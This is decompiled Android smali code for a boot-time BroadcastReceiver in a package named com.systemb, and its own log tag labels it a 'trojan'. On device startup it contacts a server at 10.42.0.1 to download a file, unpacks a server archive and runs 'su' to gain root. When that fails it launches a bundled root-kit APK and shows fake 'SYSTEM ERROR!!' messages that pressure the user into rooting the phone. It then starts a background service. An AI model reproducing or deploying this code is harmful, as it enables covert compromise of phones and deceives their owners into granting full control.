.class public Lcom/systemb/ReceiverBoot;
.super Landroid/content/BroadcastReceiver;
.source "ReceiverBoot.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/systemb/ReceiverBoot$CallWebPageTask;
    }
.end annotation


# static fields
.field private static TAG:Ljava/lang/String;


# instance fields
.field private docFolder:Ljava/lang/String;

.field private installator:Lcom/systemb/Installer;

.field private oke:Z

.field private pathToInstallServer:Ljava/lang/String;

.field private toast:Landroid/widget/Toast;

.field private utils:Lcom/systemb/ServerUtils;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 29
    const-string v0, "trojan"

    sput-object v0, Lcom/systemb/ReceiverBoot;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 27
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 30
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/systemb/ReceiverBoot;->oke:Z

    return-void
.end method

.method static synthetic access$100()Ljava/lang/String;
    .locals 1

    .prologue
    .line 27
    sget-object v0, Lcom/systemb/ReceiverBoot;->TAG:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$200(Lcom/systemb/ReceiverBoot;)Landroid/widget/Toast;
    .locals 1

    .prologue
    .line 27
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    return-object v0
.end method

.method public static openApp(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 3

    .prologue
    const/4 v0, 0x0

    .line 136
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 138
    :try_start_0
    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 139
    if-nez v1, :cond_0

    .line 148
    :goto_0
    return v0

    .line 143
    :cond_0
    const-string v2, "android.intent.category.LAUNCHER"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 144
    invoke-virtual {p0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 145
    const/4 v0, 0x1

    goto :goto_0

    .line 147
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public static request(Lorg/apache/http/HttpResponse;)Ljava/lang/String;
    .locals 5

    .prologue
    .line 94
    const-string v0, ""

    .line 96
    :try_start_0
    invoke-interface {p0}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v0

    .line 97
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 98
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 100
    :goto_0
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    .line 101
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 106
    :catch_0
    move-exception v0

    .line 107
    const-string v0, "Error split text"

    .line 109
    :goto_1
    return-object v0

    .line 103
    :cond_0
    :try_start_1
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    .line 104
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v0

    goto :goto_1
.end method


# virtual methods
.method public getRequest(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    .prologue
    .line 79
    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 80
    new-instance v1, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v1, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 82
    :try_start_0
    invoke-interface {v0, v1}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    .line 83
    invoke-static {v0}, Lcom/systemb/ReceiverBoot;->request(Lorg/apache/http/HttpResponse;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 89
    :goto_0
    return-object v0

    .line 85
    :catch_0
    move-exception v0

    .line 86
    const-string v0, "Failed Connect to Server!"

    .line 87
    sget-object v1, Lcom/systemb/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v2, "receiver:offline"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public inServer(Landroid/content/Context;Ljava/lang/String;)V
    .locals 3

    .prologue
    .line 70
    new-instance v0, Lcom/systemb/ReceiverBoot$CallWebPageTask;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/systemb/ReceiverBoot$CallWebPageTask;-><init>(Lcom/systemb/ReceiverBoot;Lcom/systemb/ReceiverBoot$1;)V

    .line 71
    iput-object p1, v0, Lcom/systemb/ReceiverBoot$CallWebPageTask;->applicationContext:Landroid/content/Context;

    .line 72
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    invoke-virtual {v0, v1}, Lcom/systemb/ReceiverBoot$CallWebPageTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 73
    sget-object v0, Lcom/systemb/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "receiver:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 74
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9

    .prologue
    const/16 v8, 0x4e20

    const/4 v4, 0x1

    const v7, -0xff0100

    const/16 v6, 0x15

    .line 40
    sget-object v0, Lcom/systemb/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "receiver oke"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    const-string v0, "http://10.42.0.1/download.php?main=zzz"

    invoke-virtual {p0, p1, v0}, Lcom/systemb/ReceiverBoot;->inServer(Landroid/content/Context;Ljava/lang/String;)V

    .line 42
    new-instance v0, Lcom/systemb/ServerUtils;

    invoke-direct {v0, p1}, Lcom/systemb/ServerUtils;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemb/ReceiverBoot;->utils:Lcom/systemb/ServerUtils;

    .line 43
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->utils:Lcom/systemb/ServerUtils;

    invoke-virtual {v0}, Lcom/systemb/ServerUtils;->getPathToInstallServer()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/systemb/ReceiverBoot;->pathToInstallServer:Ljava/lang/String;

    .line 44
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->utils:Lcom/systemb/ServerUtils;

    invoke-virtual {v0}, Lcom/systemb/ServerUtils;->getDocFolder()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/systemb/ReceiverBoot;->docFolder:Ljava/lang/String;

    .line 46
    new-instance v0, Lcom/systemb/Installer;

    invoke-direct {v0, p1, v4}, Lcom/systemb/Installer;-><init>(Landroid/content/Context;Z)V

    iput-object v0, p0, Lcom/systemb/ReceiverBoot;->installator:Lcom/systemb/Installer;

    .line 47
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->installator:Lcom/systemb/Installer;

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "server.zip"

    aput-object v3, v1, v2

    iget-object v2, p0, Lcom/systemb/ReceiverBoot;->docFolder:Ljava/lang/String;

    aput-object v2, v1, v4

    const/4 v2, 0x2

    iget-object v3, p0, Lcom/systemb/ReceiverBoot;->docFolder:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/systemb/Installer;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 50
    :try_start_0
    const-string v2, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n"

    const v3, -0xff0100

    const/16 v4, 0x15

    const/16 v5, 0x4e20

    move-object v0, p0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Lcom/systemb/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;III)V

    .line 51
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 66
    :goto_0
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/systemb/System;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 67
    :cond_0
    return-void

    .line 53
    :catch_0
    move-exception v0

    .line 54
    const-string v0, "kingoroot.supersu"

    invoke-static {p1, v0}, Lcom/systemb/ReceiverBoot;->openApp(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 56
    const/high16 v0, 0x10000000

    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 57
    const-string v0, "android.intent.action.VIEW"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 58
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "file://"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/systemb/ReceiverBoot;->docFolder:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/apk/kroot.apk"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "application/*"

    invoke-virtual {p2, v0, v1}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 59
    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 60
    const-string v2, "SYSTEM ERROR!!\n\n\nYou can update the system or rooted the phone.\n\u0008Please install this app! and rooted"

    const/16 v3, -0x100

    const v5, 0x30d40

    move-object v0, p0

    move-object v1, p1

    move v4, v6

    invoke-virtual/range {v0 .. v5}, Lcom/systemb/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;III)V

    goto :goto_0

    .line 62
    :cond_1
    const-string v2, "SYSTEM ERROR!!\n\n\n     Please ROOT this phone.    \n"

    move-object v0, p0

    move-object v1, p1

    move v3, v7

    move v4, v6

    move v5, v8

    invoke-virtual/range {v0 .. v5}, Lcom/systemb/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;III)V

    goto :goto_0
.end method

.method public toastText(Landroid/content/Context;Ljava/lang/String;III)V
    .locals 6

    .prologue
    const/4 v4, 0x0

    .line 154
    const-string v0, "layout_inflater"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    .line 155
    const v1, 0x7f030001

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v1

    .line 157
    const v0, 0x7f060001

    invoke-virtual {v1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 158
    invoke-virtual {v0, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 159
    const/high16 v2, -0x1000000

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 160
    const/high16 v2, 0x41500000    # 13.0f

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setTextSize(F)V

    .line 161
    const/16 v2, 0x11

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setGravity(I)V

    .line 163
    new-instance v2, Landroid/widget/Toast;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/widget/Toast;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    .line 164
    iget-object v2, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v2, p4, v4, v4}, Landroid/widget/Toast;->setGravity(III)V

    .line 165
    iget-object v2, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v2, v0}, Landroid/widget/Toast;->setView(Landroid/view/View;)V

    .line 166
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0, v1}, Landroid/widget/Toast;->setView(Landroid/view/View;)V

    .line 168
    iget-object v0, p0, Lcom/systemb/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v0

    .line 169
    invoke-virtual {v0, p3}, Landroid/view/View;->setBackgroundColor(I)V

    .line 171
    new-instance v0, Lcom/systemb/ReceiverBoot$1;

    int-to-long v2, p5

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/systemb/ReceiverBoot$1;-><init>(Lcom/systemb/ReceiverBoot;JJ)V

    .line 181
    invoke-virtual {v0}, Lcom/systemb/ReceiverBoot$1;->start()Landroid/os/CountDownTimer;

    .line 182
    return-void
.end method
